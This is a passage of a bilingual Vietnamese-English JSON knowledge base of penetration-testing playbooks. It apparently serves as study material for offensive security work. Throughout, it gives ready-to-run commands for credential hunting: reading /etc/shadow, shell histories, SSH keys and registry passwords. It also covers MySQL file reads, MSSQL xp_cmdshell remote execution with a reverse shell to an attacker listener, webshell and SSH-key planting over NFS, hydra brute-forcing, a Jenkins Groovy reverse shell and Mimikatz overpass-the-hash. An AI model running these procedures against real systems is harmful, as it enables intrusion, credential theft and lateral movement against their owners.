    "content": "## Playbook 29: Linux Post-Exploitation - Credential Hunting Focus 🕵️‍♂️🔑\n\n**Giả định:** Có quyền root trên Linux.\n\n**Mục tiêu:** Tìm kiếm credentials để di chuyển ngang.\n\n**Các bước thực hiện:**\n\n1.  **Tìm Mật khẩu Plaintext:**\n    ```bash\n    grep -rliE 'password|pass=|pwd=|secret' /etc /var/www /opt /home /root 2>/dev/null \n    find / -name '*.conf' -o -name '*.ini' ... -exec grep -HiE 'password|pass=|pwd=' {} \\; 2>/dev/null\n    ```\n   \n2.  **Kiểm tra Lịch sử Shell:**\n    ```bash\n    history; cat /root/.bash_history; cat /home/*/.bash_history; ... \n    ```\n   \n3.  **Thu thập Hashes:**\n    ```bash\n    cat /etc/shadow \n    ```\n   \n4.  **Tìm Khóa SSH:**\n    ```bash\n    find /root /home -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null \n    ```\n   \n5.  **Kiểm tra Biến Môi trường:** `env`.",
    "steps": [
      { "vi": "**Tìm Mật khẩu Plaintext (grep):**", "en": "**Find Plaintext Passwords (grep):**", "command": "grep -rliE 'password|pass=|pwd=|secret' /etc /var/www /opt /home /root 2>/dev/null" },
      { "vi": "**Tìm Mật khẩu Plaintext (find + grep):**", "en": "**Find Plaintext Passwords (find + grep):**", "command": "find / \\( -name '*.conf' -o -name '*.ini' -o -name '*.xml' -o -name '*.php' \\) -exec grep -HiE 'password|pass=|pwd=' {} \\; 2>/dev/null" }, // Sửa cú pháp find
      { "vi": "**Kiểm tra Lịch sử Shell:**", "en": "**Check Shell History:**", "command": "history; cat /root/.bash_history; cat /home/*/.bash_history; cat /home/*/.mysql_history; cat /home/*/.nano_history; cat /home/*/.viminfo" },
      { "vi": "**Thu thập Hashes:**", "en": "**Collect Hashes:**", "command": "cat /etc/shadow" },
      { "vi": "**Tìm Khóa SSH:**", "en": "**Find SSH Keys:**", "command": "find /root /home -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null" },
      { "vi": "**Kiểm tra Biến Môi trường:**", "en": "**Check Environment Variables:**", "command": "env" }
    ],
    "related_knowledge_ids": ["post_exploitation_windows_recon", "grep", "find", "history", "linux_important_locations_users_auth", "linux_important_locations_user_history_config", "cat /etc/shadow", "linuxprivesc_manual_password_loot", "password_cracking_ssh_key_passphrase", "ssh2john", "john", "linuxprivesc_sensitive_info_enum", "env"]
  },
  "playbook_30_postex_windows_creds": {
    "title": {
      "vi": "Playbook 30: Windows Post-Exploitation - Credential Hunting Focus",
      "en": "Playbook 30: Windows Post-Exploitation - Credential Hunting Focus"
    },
    "assumption": "Đã có quyền Administrator/SYSTEM trên máy Windows.",
    "objective": "Tìm kiếm chuyên sâu các credentials (plaintext, hash, tickets) để di chuyển ngang.",
    "tools": ["mimikatz", "reg", "findstr", "Get-ChildItem", "cmdkey", "impacket-secretsdump"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Dumping", "Registry Searching", "File Searching"],
    "targets": ["LSASS", "SAM", "Registry", "Configuration Files", "Kerberos Tickets"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "credential hunting", "mimikatz", "registry", "findstr", "get-childitem", "cmdkey", "secretsdump", "plaintext password", "ntlm hash", "kerberos tickets"],
    "content": "## Playbook 30: Windows Post-Exploitation - Credential Hunting Focus 🕵️‍♀️🔑\n\n**Giả định:** Có quyền Admin/SYSTEM trên Windows.\n\n**Mục tiêu:** Tìm kiếm credentials để di chuyển ngang.\n\n**Các bước thực hiện:**\n\n1.  **Dump từ LSASS/SAM (Mimikatz):** (Xem Playbook 20).\n2.  **Tìm Mật khẩu Plaintext trong Registry:**\n    ```powershell\n    reg query HKLM /f password /t REG_SZ /s \n    reg query HKCU /f password /t REG_SZ /s \n    # Kiểm tra key cụ thể...\n    ```\n   \n3.  **Tìm Mật khẩu Plaintext trong Files:**\n    ```powershell\n    findstr /spin \"password\" C:\\*.* /L \n    # Tìm file config cụ thể...\n    Get-ChildItem -Path C:\\ ... | Select-String ...\n    ```\n   \n4.  **Kiểm tra Credential Manager:** `cmdkey /list`.\n5.  **Kiểm tra PowerShell History/Transcripts:** ...\n6.  **Dump SAM/SYSTEM Offline:** ...", // Content rút gọn
    "steps": [
      { "vi": "**Dump từ LSASS/SAM (Mimikatz):** (Xem Playbook 20).", "en": "**Dump from LSASS/SAM (Mimikatz):** (See Playbook 20)." },
      { "vi": "**Tìm Creds trong Registry (HKLM):**", "en": "**Find Creds in Registry (HKLM):**", "command": "reg query HKLM /f password /t REG_SZ /s" },
      { "vi": "**Tìm Creds trong Registry (HKCU):**", "en": "**Find Creds in Registry (HKCU):**", "command": "reg query HKCU /f password /t REG_SZ /s" },
      { "vi": "**Kiểm tra Registry Keys cụ thể:** (Winlogon, Putty, VNC)", "en": "**Check Specific Registry Keys:** (Winlogon, Putty, VNC)" },
      { "vi": "**Tìm Creds trong Files (findstr):**", "en": "**Find Creds in Files (findstr):**", "command": "findstr /spin \"password\" C:\\*.* /L" },
      { "vi": "**Tìm Creds trong Files (PowerShell):**", "en": "**Find Creds in Files (PowerShell):**", "command": "Get-ChildItem -Path C:\\ -Include *.kdbx,*.config,*.ini,*.xml,*.txt -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password','pass','pwd','secret'" },
      { "vi": "**Kiểm tra Credential Manager:**", "en": "**Check Credential Manager:**", "command": "cmdkey /list" },
      { "vi": "**Kiểm tra PowerShell History/Transcripts.**", "en": "**Check PowerShell History/Transcripts.**" },
      { "vi": "**Dump SAM/SYSTEM Offline (nếu chưa làm):** (Xem Playbook 19).", "en": "**Dump SAM/SYSTEM Offline (if not done):** (See Playbook 19)." }
    ],
    "related_knowledge_ids": ["playbook_20_windows_postex_mimikatz", "reg query", "winprivesc_password_hunting_registry", "findstr", "winprivesc_password_hunting_files", "post_exploitation_windows_recon", "Get-ChildItem", "cmdkey", "winprivesc_runas_savedcreds", "playbook_19_windows_privesc_sam_backup"] // Đã sửa tham chiếu
  },
  "playbook_31_foothold_mysql_loadfile": {
    "title": {
      "vi": "Playbook 31: Foothold qua MySQL (Port 3306) - Đọc File",
      "en": "Playbook 31: Foothold via MySQL (Port 3306) - File Read"
    },
    "assumption": "Phát hiện Port 3306 (MySQL/MariaDB) mở. Có credentials hợp lệ (từ brute-force hoặc nguồn khác).",
    "objective": "Sử dụng quyền truy cập MySQL để đọc các file nhạy cảm trên hệ thống.",
    "tools": ["mysql", "nmap", "hydra"],
    "phases": ["Initial Foothold", "Enumeration"],
    "techniques": ["Database Interaction", "File Read"],
    "targets": ["MySQL", "MariaDB", "Linux Filesystem", "Windows Filesystem"], // Added Windows Filesystem
    "os": ["Any (Server OS)"],
    "tags": ["foothold", "mysql", "mariadb", "port_3306", "file read", "load_file", "enumeration", "database"],
    "content": "## Playbook 31: Foothold qua MySQL (Port 3306) - Đọc File 🚪🔑➡️📄\n\n**Giả định:** MySQL (3306) mở, có credentials hợp lệ.\n\n**Mục tiêu:** Đọc file hệ thống qua MySQL.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Dịch vụ & Lấy Creds (Nếu chưa có):**\n    * `nmap -sV -p 3306 --script=mysql-info,mysql-enum <target_ip>`.\n    * `hydra -L users.txt -P passwords.txt <target_ip> mysql`.\n2.  **Kết nối MySQL:** `mysql -u <user> -p'<password>' -h <target_ip>`.\n3.  **Thử đọc File:**\n    ```sql\n    SELECT LOAD_FILE('/etc/passwd');\n    SELECT LOAD_FILE('/home/<user>/.ssh/id_rsa');\n    SELECT LOAD_FILE('C:/Users/Admin/Desktop/passwords.txt'); -- Windows Path\n    ```\n   \n4.  **Phân tích File:** Lưu lại nội dung.",
    "steps": [
      { "vi": "**Scan & Brute (Nếu cần):**", "en": "**Scan & Brute (If needed):**", "command": "nmap -sV -p 3306 --script=mysql-info,mysql-enum <target_ip>; hydra -L users.txt -P passwords.txt <target_ip> mysql" },
      { "vi": "**Kết nối MySQL:**", "en": "**Connect MySQL:**", "command": "mysql -u <user> -p'<password>' -h <target_ip>" },
      { "vi": "**Đọc File Linux (Ví dụ):**", "en": "**Read Linux File (Example):**", "command": "SELECT LOAD_FILE('/etc/passwd');" },
      { "vi": "**Đọc File Windows (Ví dụ):**", "en": "**Read Windows File (Example):**", "command": "SELECT LOAD_FILE('C:/Users/Admin/Desktop/passwords.txt');" }
    ],
    "related_knowledge_ids": ["port_3306", "mysql", "nmap", "hydra", "sqli_theory_connection"]
  },
  "playbook_32_foothold_mssql_xpcmdshell": {
    "title": {
      "vi": "Playbook 32: Foothold qua MSSQL (Port 1433) - xp_cmdshell RCE",
      "en": "Playbook 32: Foothold via MSSQL (Port 1433) - xp_cmdshell RCE"
    },
    "assumption": "Phát hiện Port 1433 (MSSQL) mở. Có credentials hợp lệ (từ brute-force hoặc nguồn khác) có quyền bật và sử dụng `xp_cmdshell` (thường là 'sa' hoặc tương đương).",
    "objective": "Sử dụng `xp_cmdshell` để thực thi lệnh hệ thống và giành reverse shell.",
    "tools": ["nmap", "hydra", "impacket-mssqlclient", "msfconsole (auxiliary/scanner/mssql/mssql_login)", "nc"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["Database Interaction", "RCE", "xp_cmdshell", "Reverse Shell"],
    "targets": ["MSSQL", "Windows OS"],
    "os": ["Windows"],
    "tags": ["foothold", "mssql", "port_1433", "rce", "xp_cmdshell", "reverse shell", "impacket-mssqlclient", "hydra"],
    "content": "## Playbook 32: Foothold qua MSSQL (Port 1433) - xp_cmdshell RCE 🚪🔑➡️💻➡️🐚\n\n**Giả định:** MSSQL (1433) mở, có creds đặc quyền ('sa').\n\n**Mục tiêu:** RCE qua `xp_cmdshell` để lấy reverse shell.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Dịch vụ & Lấy Creds (Nếu chưa có):**\n    * `nmap -p 1433 -sV <target_ip>`.\n    * `hydra -L users.txt -P passwords.txt <target_ip> mssql`.\n    * `msfconsole -qx \"... mssql_login ...\"`.\n2.  **Kết nối MSSQL:**\n    ```bash\n    impacket-mssqlclient <domain>/<user>:<password>@<target_ip> -windows-auth \n    impacket-mssqlclient sa:<password>@<target_ip> \n    ```\n   \n3.  **Bật xp_cmdshell (Nếu cần):**\n    ```sql\n    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n    ```\n   \n4.  **Kiểm tra Thực thi Lệnh:** `EXEC xp_cmdshell 'whoami';`.\n5.  **Lấy Reverse Shell:** Mở Listener `rlwrap nc -lvnp 4444`. Thực thi payload `powershell -e ...`.",
    "steps": [
      { "vi": "**Scan & Brute (Nếu cần):**", "en": "**Scan & Brute (If needed):**", "command": "nmap -p 1433 <target_ip>; hydra -L u.txt -P p.txt <target_ip> mssql" },
      { "vi": "**Kết nối (SQL Auth):**", "en": "**Connect (SQL Auth):**", "command": "impacket-mssqlclient sa:<password>@<target_ip>" },
      { "vi": "**Kết nối (Windows Auth):**", "en": "**Connect (Windows Auth):**", "command": "impacket-mssqlclient <domain>/<user>:<password>@<target_ip> -windows-auth" },
      { "vi": "**Bật xp_cmdshell:**", "en": "**Enable xp_cmdshell:**", "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" },
      { "vi": "**Kiểm tra lệnh:**", "en": "**Test command:**", "command": "EXEC xp_cmdshell 'whoami';" },
      { "vi": "**Mở Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4444" },
      { "vi": "**Lấy Shell (PowerShell Base64):**", "en": "**Get Shell (PowerShell Base64):**", "command": "EXEC xp_cmdshell 'powershell -e <base64_payload_to_kali_ip:4444>';" }
    ],
    "related_knowledge_ids": ["port_1433", "mssql", "nmap", "hydra", "impacket-mssqlclient", "msfconsole", "xp_cmdshell", "sqli_theory_connection", "sqli_rce_manual", "rce_kali_setup", "rce_powershell", "sqli_lab_capstone7_mssql_timebased"]
  },
  "playbook_33_foothold_nfs_mount": {
    "title": {
      "vi": "Playbook 33: Foothold qua NFS Mount (Đọc/Ghi File)",
      "en": "Playbook 33: Foothold via NFS Mount (File Read/Write)"
    },
    "assumption": "Nmap tìm thấy Port 2049 (NFS) mở. `showmount -e` hiển thị một share có thể mount (ví dụ: `/home` hoặc `/var/www`).",
    "objective": "Mount NFS share để đọc file nhạy cảm hoặc ghi file (ví dụ: webshell, public key SSH) để giành quyền truy cập.",
    "tools": ["nmap", "showmount", "mount", "cp", "ssh-keygen"],
    "phases": ["Initial Foothold", "Enumeration"],
    "techniques": ["NFS Enumeration", "NFS Mount", "File Read", "File Write"],
    "targets": ["NFS Share"],
    "os": ["Linux"],
    "tags": ["foothold", "nfs", "port_2049", "mount", "showmount", "file read", "file write", "webshell", "ssh key"],
    "content": "## Playbook 33: Foothold qua NFS Mount 🚪💾➡️📄/🔑\n\n**Giả định:** NFS (2049) mở, `showmount -e` hiển thị share có thể mount.\n\n**Mục tiêu:** Mount share để đọc/ghi file giành quyền truy cập.\n\n**Các bước thực hiện:**\n\n1.  **Liệt kê Shares:** `showmount -e <target_ip>`.\n2.  **Mount Share trên Kali:**\n    ```bash\n    sudo mkdir /mnt/nfs_target\n    sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_target -o nolock \n    ```\n   \n3.  **Enumeration trên Share:** `ls -laR /mnt/nfs_target`.\n4.  **Đọc File Nhạy cảm:** `cat /mnt/nfs_target/path/to/sensitive.conf`.\n5.  **Ghi File (Nếu có):**\n    * Ghi Webshell: `sudo cp shell.php /mnt/nfs_target/`.\n    * Ghi SSH Key: `ssh-keygen`, `sudo cp ~/.ssh/id_rsa.pub /mnt/nfs_target/.ssh/authorized_keys`, `sudo chmod/chown`.\n6.  **Unmount Share:** `sudo umount /mnt/nfs_target`.",
    "steps": [
      { "vi": "**Liệt kê Shares:**", "en": "**List Shares:**", "command": "showmount -e <target_ip>" },
      { "vi": "**Mount Share (Kali):**", "en": "**Mount Share (Kali):**", "command": "sudo mkdir /mnt/nfs_target; sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_target -o nolock" },
      { "vi": "**Enum trên Share:**", "en": "**Enum on Share:**", "command": "ls -laR /mnt/nfs_target" },
      { "vi": "**Đọc File:**", "en": "**Read File:**", "command": "cat /mnt/nfs_target/path/to/config.bak" },
      { "vi": "**Ghi Webshell (Nếu mount web root):**", "en": "**Write Webshell (If web root mounted):**", "command": "sudo cp shell.php /mnt/nfs_target/" },
      { "vi": "**Ghi SSH Key (Nếu mount home dir):**", "en": "**Write SSH Key (If home dir mounted):**", "command": "ssh-keygen; sudo cp ~/.ssh/id_rsa.pub /mnt/nfs_target/.ssh/authorized_keys; sudo chmod 600 /mnt/nfs_target/.ssh/authorized_keys" },
      { "vi": "**Đăng nhập SSH (Nếu ghi key thành công):**", "en": "**Login SSH (If key write successful):**", "command": "ssh -i ~/.ssh/id_rsa <target_user>@<target_ip>" }
    ],
    "related_knowledge_ids": ["port_2049", "nfs", "nfs_enumeration", "showmount", "mount", "cp", "ssh-keygen", "add_ssh_public_key", "chmod"]
  },
  "playbook_34_foothold_telnet_brute": {
    "title": {
      "vi": "Playbook 34: Foothold qua Telnet (Port 23) Brute-Force",
      "en": "Playbook 34: Foothold via Telnet (Port 23) Brute-Force"
    },
    "assumption": "Nmap tìm thấy Port 23 (Telnet) mở. Có danh sách username.",
    "objective": "Giành quyền truy cập Telnet shell bằng tấn công brute-force.",
    "tools": ["nmap", "hydra", "telnet"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Brute Force", "Telnet Login"],
    "targets": ["Telnet Service"],
    "os": ["Any"],
    "tags": ["foothold", "telnet", "port_23", "brute force", "hydra", "cleartext"],
    "content": "## Playbook 34: Foothold qua Telnet Brute-Force 🚪🔑➡️💲\n\n**Giả định:** Telnet (Port 23) mở, có danh sách user.\n\n**CẢNH BÁO:** Telnet gửi credentials dạng cleartext!\n\n**Mục tiêu:** Giành quyền truy cập Telnet.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Port:** `nmap -p 23 -sV <target_ip>`.\n2.  **Brute-Force Credentials:**\n    ```bash\n    hydra -L users.txt -P /path/to/rockyou.txt <target_ip> telnet \n    ```\n   \n3.  **Kết nối Telnet:** `telnet <target_ip>`.",
    "steps": [
      { "vi": "**Brute-Force (Hydra):**", "en": "**Brute-Force (Hydra):**", "command": "hydra -L users.txt -P /path/to/rockyou.txt <target_ip> telnet" },
      { "vi": "**Kết nối Telnet:**", "en": "**Connect Telnet:**", "command": "telnet <target_ip>" }
    ],
    "related_knowledge_ids": ["port_23", "telnet", "hydra", "nmap"]
  },
  "playbook_35_enum_smtp_users": {
    "title": {
      "vi": "Playbook 35: Enumeration - Liệt kê User SMTP (VRFY/EXPN)",
      "en": "Playbook 35: Enumeration - SMTP User Listing (VRFY/EXPN)"
    },
    "assumption": "Nmap tìm thấy Port 25 (SMTP) mở. Máy chủ có thể hỗ trợ lệnh VRFY hoặc EXPN.",
    "objective": "Xác định các username hợp lệ trên hệ thống thông qua máy chủ SMTP.",
    "tools": ["nmap", "nc", "telnet", "smtp-user-enum"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["SMTP User Enumeration", "VRFY", "EXPN"],
    "targets": ["SMTP Server"],
    "os": ["Any"],
    "tags": ["enumeration", "recon", "smtp", "port_25", "user enumeration", "vrfy", "expn", "smtp-user-enum", "nmap"],
    "content": "## Playbook 35: Enumeration - Liệt kê User SMTP 🕵️‍♂️📧\n\n**Giả định:** SMTP (Port 25) mở, có thể hỗ trợ VRFY/EXPN.\n\n**Mục tiêu:** Liệt kê username hợp lệ.\n\n**Các bước thực hiện:**\n\n1.  **Kiểm tra Thủ công:** `nc -nv <target_ip> 25`, thử `VRFY <user>`, `EXPN <list>`.\n2.  **Nmap Script:** `nmap --script smtp-commands,smtp-enum-users -p 25 <target_ip>`.\n3.  **smtp-user-enum:** `smtp-user-enum -M VRFY -U users.txt -t <target_ip>`.",
    "steps": [
      { "vi": "**Kiểm tra Thủ công (nc):**", "en": "**Manual Check (nc):**", "command": "nc -nv <target_ip> 25" },
      { "vi": "**Thử VRFY/EXPN:**", "en": "**Try VRFY/EXPN:**", "command": "VRFY username / EXPN listname" },
      { "vi": "**Nmap Script:**", "en": "**Nmap Script:**", "command": "nmap --script smtp-commands,smtp-enum-users -p 25 <target_ip>" },
      { "vi": "**smtp-user-enum (VRFY):**", "en": "**smtp-user-enum (VRFY):**", "command": "smtp-user-enum -M VRFY -U users.txt -t <target_ip>" }
    ],
    "related_knowledge_ids": ["port_25", "smtp", "vrfy", "expn", "nmap", "nc", "telnet", "smtp-user-enum", "smtp_enumeration_phishing"]
  },
  "playbook_36_enum_dns_zone_transfer": {
    "title": {
      "vi": "Playbook 36: Enumeration - DNS Zone Transfer (AXFR)",
      "en": "Playbook 36: Enumeration - DNS Zone Transfer (AXFR)"
    },
    "assumption": "Nmap tìm thấy Port 53 (DNS) mở. Đã xác định được name server và domain name.",
    "objective": "Thực hiện Zone Transfer để lấy toàn bộ bản ghi DNS của domain.",
    "tools": ["dig", "host", "dnsrecon", "dnsenum"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["DNS Zone Transfer", "AXFR"],
    "targets": ["DNS Server"],
    "os": ["Any"],
    "tags": ["enumeration", "recon", "dns", "port_53", "zone transfer", "axfr", "dig", "host", "dnsrecon", "dnsenum"],
    "content": "## Playbook 36: Enumeration - DNS Zone Transfer 🕵️‍♂️🗺️\n\n**Giả định:** DNS (Port 53) mở, biết name server và domain name.\n\n**Mục tiêu:** Thực hiện Zone Transfer (AXFR).\n\n**Các bước thực hiện:**\n\n1.  **Xác định Name Server:** `host -t ns <domain_name>`.\n2.  **Thử Zone Transfer (dig):** `dig axfr @<dns_server_ip> <domain_name>`.\n3.  **Thử Zone Transfer (host):** `host -l <domain_name> <dns_server_ip>`.\n4.  **Thử Zone Transfer (dnsrecon):** `dnsrecon -d <domain_name> -t axfr`.",
    "steps": [
      { "vi": "**Xác định Name Server:**", "en": "**Identify Name Server:**", "command": "host -t ns <domain_name>" },
      { "vi": "**Thử AXFR (dig):**", "en": "**Attempt AXFR (dig):**", "command": "dig axfr @<dns_server_ip> <domain_name>" },
      { "vi": "**Thử AXFR (host):**", "en": "**Attempt AXFR (host):**", "command": "host -l <domain_name> <dns_server_ip>" },
      { "vi": "**Thử AXFR (dnsrecon):**", "en": "**Attempt AXFR (dnsrecon):**", "command": "dnsrecon -d <domain_name> -t axfr" }
    ],
    "related_knowledge_ids": ["port_53", "dns", "zone transfer", "axfr", "dig", "host", "dnsrecon", "dnsenum", "active_dns_enum", "aws_enum_dns_recon"]
  },
  "playbook_37_enum_snmp_details": {
    "title": {
      "vi": "Playbook 37: Enumeration - SNMP Chi tiết (Walk OIDs)",
      "en": "Playbook 37: Enumeration - Detailed SNMP (Walk OIDs)"
    },
    "assumption": "Nmap tìm thấy Port 161 (SNMP) mở (UDP). Đã xác định được community string (thường là 'public' hoặc 'private').",
    "objective": "Sử dụng `snmpwalk` để truy vấn các OID cụ thể nhằm thu thập thông tin chi tiết về hệ thống (Users, Processes, Software, Network).",
    "tools": ["nmap", "snmpwalk", "snmpcheck"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["SNMP Enumeration", "MIB Walking", "OID Querying"],
    "targets": ["SNMP Service", "Network Device", "Windows Host"],
    "os": ["Any"],
    "tags": ["enumeration", "recon", "snmp", "port_161", "snmpwalk", "snmpcheck", "oid", "mib", "windows"],
    "content": "## Playbook 37: Enumeration - SNMP Chi tiết 🕵️‍♂️🌳\n\n**Giả định:** SNMP (Port 161 UDP) mở, có community string (ví dụ: 'public').\n\n**Mục tiêu:** Truy vấn OID cụ thể để lấy thông tin chi tiết.\n\n**Các bước thực hiện:**\n\n1.  **Walk Toàn bộ MIB:** `snmpwalk -c public -v1 <target_ip>`.\n2.  **snmpcheck (Tổng quát):** `snmp-check -t <target_ip> -c public`.\n3.  **Truy vấn OID Cụ thể (Windows):**\n    * User Accounts: `snmpwalk -c public -v1 <target_ip> 1.3.6.1.4.1.77.1.2.25`\n    * Running Programs: `snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.25.4.2.1.2`\n    * TCP Ports: `snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.6.13.1.3`.",
    "steps": [
      { "vi": "**Walk Toàn bộ MIB:**", "en": "**Walk Full MIB:**", "command": "snmpwalk -c public -v1 <target_ip>" },
      { "vi": "**snmpcheck:**", "en": "**snmpcheck:**", "command": "snmp-check -t <target_ip> -c public" },
      { "vi": "**Walk User Accounts:**", "en": "**Walk User Accounts:**", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.4.1.77.1.2.25" },
      { "vi": "**Walk Running Programs:**", "en": "**Walk Running Programs:**", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.25.4.2.1.2" },
      { "vi": "**Walk TCP Ports:**", "en": "**Walk TCP Ports:**", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.6.13.1.3" }
    ],
    "related_knowledge_ids": ["port_161", "snmp", "snmp_enumeration", "snmpwalk", "snmpcheck", "oid", "mib", "snmp_windows_mibs", "active_snmp_enum"]
  },
  "playbook_38_enum_rpc_details": {
    "title": {
      "vi": "Playbook 38: Enumeration - RPC Chi tiết (rpcclient)",
      "en": "Playbook 38: Enumeration - Detailed RPC (rpcclient)"
    },
    "assumption": "Nmap tìm thấy Port 135 (RPC) và/hoặc 445 (SMB, thường dùng RPC) mở trên máy Windows.",
    "objective": "Sử dụng `rpcclient` để liệt kê thông tin hệ thống, users, groups, shares từ RPC endpoint.",
    "tools": ["nmap", "rpcclient"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["RPC Enumeration", "User Enumeration", "Group Enumeration", "Share Enumeration"],
    "targets": ["Windows RPC Service"],
    "os": ["Windows"],
    "tags": ["enumeration", "recon", "rpc", "port_135", "port_445", "rpcclient", "windows", "user enumeration", "share enumeration"],
    "content": "## Playbook 38: Enumeration - RPC Chi tiết 🕵️‍♂️💻\n\n**Giả định:** RPC (Port 135/445) mở trên Windows.\n\n**Mục tiêu:** Liệt kê thông tin qua `rpcclient`.\n\n**Các bước thực hiện:**\n\n1.  **Kết nối (Null Session):** `rpcclient -U \"\" -N <target_ip>`.\n2.  **Kết nối (Creds):** `rpcclient -U '<domain>/<user>%<password>' <target_ip>`.\n3.  **Lệnh Enum (trong rpcclient):** `srvinfo`, `enumdomusers`, `enumdomgroups`, `netshareenumall`, `queryuser <RID>`, `lookupnames <user>`, `lookupsids <SID>`.",
    "steps": [
      { "vi": "**Kết nối Null Session:**", "en": "**Connect Null Session:**", "command": "rpcclient -U \"\" -N <target_ip>" },
      { "vi": "**Kết nối Với Creds:**", "en": "**Connect With Creds:**", "command": "rpcclient -U '<domain>/<user>%<password>' <target_ip>" },
      { "vi": "**Liệt kê Users (rpc>):**", "en": "**List Users (rpc>):**", "command": "enumdomusers" },
      { "vi": "**Liệt kê Shares (rpc>):**", "en": "**List Shares (rpc>):**", "command": "netshareenumall" },
      { "vi": "**Thông tin Server (rpc>):**", "en": "**Server Info (rpc>):**", "command": "srvinfo" }
    ],
    "related_knowledge_ids": ["rpc_enumeration", "rpcclient", "port_135", "port_445"]
  },
  "playbook_39_foothold_jenkins_groovy": {
    "title": {
      "vi": "Playbook 39: Foothold qua Jenkins Script Console (Groovy RCE)",
      "en": "Playbook 39: Foothold via Jenkins Script Console (Groovy RCE)"
    },
    "assumption": "Phát hiện Jenkins đang chạy trên web server. Có quyền truy cập vào Script Console (`/script`) (thường cần creds admin, hoặc đôi khi bị lộ).",
    "objective": "Thực thi Groovy script để giành reverse shell.",
    "tools": ["nmap", "gobuster", "curl", "nc", "groovy"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["Jenkins Exploitation", "Groovy Scripting", "RCE", "Reverse Shell"],
    "targets": ["Jenkins"],
    "os": ["Any (Server OS)"],
    "tags": ["foothold", "jenkins", "groovy", "rce", "reverse shell", "script console"],
    "content": "## Playbook 39: Foothold qua Jenkins Script Console 🚪👨‍💻➡️🐚\n\n**Giả định:** Jenkins đang chạy, có quyền truy cập `/script`.\n\n**Mục tiêu:** RCE qua Groovy script để lấy reverse shell.\n\n**Các bước thực hiện:**\n\n1.  **Truy cập Script Console:** `http://<target_ip>:[PORT]/script`.\n2.  **Chuẩn bị Payload Groovy:** (Copy payload reverse shell, thay IP/Port).\n3.  **Mở Listener:** `rlwrap nc -lvnp [PORT]`.\n4.  **Thực thi Script:** Dán payload vào Console và Run.",
    "steps": [
      { "vi": "**Truy cập Script Console:**", "en": "**Access Script Console:**", "command": "http://<target_ip>:[PORT]/script" },
      { "vi": "**Chuẩn bị Payload Groovy:**", "en": "**Prepare Groovy Payload:**", "command": "# Copy Groovy code, replace KALI_IP and PORT (see knowledge_base for code)" },
      { "vi": "**Mở Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp [PORT]" },
      { "vi": "**Dán & Chạy Script:**", "en": "**Paste & Run Script:**", "command": "# Paste Groovy code into Jenkins Script Console and click Run" }
    ],
    "related_knowledge_ids": ["exploitation_reverse_shell_groovy_jenkins", "jenkins", "groovy", "rce", "reverse_shell", "nc", "rce_kali_setup"]
  },
  "playbook_40_ad_overpass_the_hash": {
    "title": {
      "vi": "Playbook 40: AD Attack - Overpass the Hash",
      "en": "Playbook 40: AD Attack - Overpass the Hash"
    },
    "assumption": "Đã có NTLM hash của một user domain. Cần truy cập các dịch vụ sử dụng xác thực Kerberos thay vì NTLM.",
    "objective": "Sử dụng NTLM hash để yêu cầu Kerberos TGT, sau đó sử dụng TGT đó để xác thực.",
    "tools": ["mimikatz", "klist"],
    "phases": ["Lateral Movement", "Privilege Escalation"],
    "techniques": ["Overpass the Hash", "Pass the Hash", "Kerberos Attack"],
    "targets": ["Active Directory Accounts", "Kerberos Services"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "overpass the hash", "pass the hash", "pth", "kerberos", "tgt", "mimikatz", "klist"],
    "content": "## Playbook 40: AD Attack - Overpass the Hash 🚶‍♂️🔑➡️🎫➡️💻\n\n**Giả định:** Có NTLM hash, cần truy cập dịch vụ Kerberos.\n\n**Mục tiêu:** Dùng NTLM hash lấy TGT Kerberos.\n\n**Các bước thực hiện:**\n\n1.  **Chạy Mimikatz PTH:** `privilege::debug; sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTHash> /run:powershell.exe`.\n2.  **Xác minh Ticket (PowerShell mới):** `klist`.\n3.  **Truy cập Dịch vụ (PowerShell mới):** `Enter-PSSession -ComputerName <target>`, `dir \\\\<server>\\share$`.",
    "steps": [
      { "vi": "**Chạy Mimikatz PTH:**", "en": "**Run Mimikatz PTH:**", "command": "privilege::debug; sekurlsa::pth /user:<username> /domain:<domain.local> /ntlm:<NTHash> /run:powershell.exe" },
      { "vi": "**Xác minh Ticket (PowerShell mới):**", "en": "**Verify Ticket (New PowerShell):**", "command": "klist" },
      { "vi": "**Truy cập Tài nguyên (PowerShell mới):**", "en": "**Access Resource (New PowerShell):**", "command": "Enter-PSSession -ComputerName <target_server>" }
    ],
    "related_knowledge_ids": ["overpass_the_hash", "pass_the_hash", "mimikatz", "sekurlsa::pth", "klist", "kerberos"]
  },
  "playbook_41_file_transfer_http_upload": {
    "title": {
      "vi": "Playbook 41: File Transfer - Tải File lên Target qua HTTP Server",
      "en": "Playbook 41: File Transfer - Uploading Files to Target via HTTP Server"
    },
    "assumption": "Có shell trên máy target (Linux/Windows). Target có thể kết nối HTTP ra máy Kali.",
    "objective": "Chuyển file từ Kali lên máy target.",
